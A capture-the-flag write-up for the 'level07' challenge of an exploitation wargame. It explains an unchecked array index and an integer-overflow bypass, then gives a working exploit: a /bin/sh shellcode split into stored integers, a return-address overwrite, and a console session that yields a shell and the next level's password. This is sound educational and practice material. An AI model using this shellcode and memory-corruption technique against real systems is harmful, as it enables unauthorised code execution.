# level07

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Basically, this program is a number storage service. `main` declares an array of a hundred unsigned integers that the
user can handle via differents commands read from the standard input :

- `read` calls an associated function `read_number` that asks for an index of the array to look at and prints the value
  stored at this address.
- `store` calls `store_number` that first asks the user for a value to store, then for an index where to put it. A
  condition prevents us to store any value every 3 indexes (0, 3, 6...).
- `quit` obviously exits the program.

The first vulnerability we notice is that the index is never checked by any functions. The input is read by `scanf`
which interprets it as an unsigned integer, then used as it is to move through the array.

We expect to use this lack of security to read/write almost everywhere on the stack, especially at the return address of
`main` in order to redirect the execution flow. Our idea is to inject some shellcode, as we did many times in previous
levels, but we are confronted to some difficulties here.

At the beginning of the execution, the program deletes any argument and environment variable that could have been
supplied, so we cannot store our shellcode this way. Therefore, the only area available from our knowledge is the array
used to store numbers, but we need to find a way to bypass the restriction of the forbidden indexes.

Let's take a look at the function `store_number` to understand how it handles the index values we send.

```gdb
gdb-peda$ pd store_number
Dump of assembler code for function store_number:
    [...]
    0x08048666 <+54>:    call   0x80485e7 <get_unum>        ; get the index by calling scanf("%u", &number)
    0x0804866b <+59>:    mov    DWORD PTR [ebp-0xc],eax     ; store it to [ebp-0xc]
    [...]
    0x080486c2 <+146>:    mov    eax,DWORD PTR [ebp-0xc]
    0x080486c5 <+149>:    shl    eax,0x2                    ; shift left twice => multiply by four
    0x080486c8 <+152>:    add    eax,DWORD PTR [ebp+0x8]    ; [ebp+0x8] is the array address
    0x080486cb <+155>:    mov    edx,DWORD PTR [ebp-0x10]   ; [ebp-0x10] is the value we want to store
    0x080486ce <+158>:    mov    DWORD PTR [eax],edx        ; store the value at the offset/index
    [...]
```

The shift operation here is very interesting. It will transform the index we provide to get the effective offset (in
byte) where to store the value. Basically, if we want to store a value at the 2nd cell of our unsigned integers array,
we need to move to `array address + (2 * 4)` since an integer is 4-byte long. Pretty obvious in fact.

By mixing this information with the use of an integer overflow, we will be able to write at the forbidden indexes.
Sweet!

## Exploit

We first use GDB in order to find the offset of the saved `main` return address from the array.

```gdb
gdb-peda$ b *0x0804892b                             ## <read_number> call address, easy way to find the array address with peda display
Breakpoint 1 at 0x804892b
gdb-peda$ r
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
=> 0x804892b <main+520>:	call   0x80486d7 <read_number>
Guessed arguments:
arg[0]: 0xffffd544 --> 0x0                          ## array address
Breakpoint 1, 0x0804892b in main ()

gdb-peda$ info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 called by frame at 0xffffd780
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
  eip at 0xffffd70c                                 ## saved EIP / main return address
```

Now that we have both saved EIP and array addresses, we can find the offset with a simple subtraction.

```python
>>> 0xffffd70c - 0xffffd544
456                             ## bytes offset
>>> 456 / 4
114                             ## array index representation
```

Guess what? `114 % 3 = 0` so 114 is part of the forbidden indexes. Hopefully it is not a problem anymore. 😁

From here, we have tried to perform the exploit, and have failed because the array address `0xffffd544` that we have
stored at the EIP address to jump in was bad. Why? Because GDB alter the stack size by adding/changing environment
variables.

Looking for a way to get the array address when running the program in an "regular" environment, we found out that we
could use a negative index to dump lower stack addresses than the array one. We use gdb once again to find the offset
between the array and its address pushed on stack when `read_number` is called.

```gdb
gdb-peda$ b *0x80486da                              ## beginning of <read_number>
Breakpoint 1 at 0x804892b
gdb-peda$ r
=> 0x80486da <read_number+3>:	sub    esp,0x28
Breakpoint 1, 0x080486da in read_number ()

gdb-peda$ x $ebp+8
0xffffd520:	0xffffd544
```

```python
>>> 0xffffd544 - 0xffffd520
36
>>> 36 / 4
9
```

Good, we will read the index `-9` in order to get the right array address to inject at the `main` return address.

We have almost everything we need now. We use a tiny shellcode (21 bytes long), split it in 4-byte parts and reverse the
bytes order in each part, according to the endianness. We will use the 6th first indexes of the array to store this
shellcode. Let's compute the values needed, then start the exploit.

`execve("/bin/sh")` shellcode: `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`.

```python
# Shellcode values
>>> 0x99580b6a
2572684138
>>> 0x2f2f6852
791636050
>>> 0x2f686873
795371635
>>> 0x896e6962
2305714530
>>> 0xcdc931e3
3452514787
>>> 0x80
128

# Integer overflow for indexes 0 and 3 
>>> (2**32) / 4
1073741824
>>> (2**32 + (4 * 3)) / 4
1073741827

# Integer overflow for index 114 (EIP)
>>> (2**32 + (4 * 114)) / 4
1073741938
``` 

```console
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 2572684138
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 791636050
 Index: 1
 Completed store command successfully
Input command: store
 Number: 795371635
 Index: 2
 Completed store command successfully
Input command: store
 Number: 2305714530
 Index: 1073741827
 Completed store command successfully
Input command: store
 Number: 3452514787
 Index: 4
 Completed store command successfully
Input command: store
 Number: 128
 Index: 5
 Completed store command successfully
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956388           # this is the address of the array
 Completed read command successfully
Input command: store
 Number: 4294956388                                 # that we put in the EIP address
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
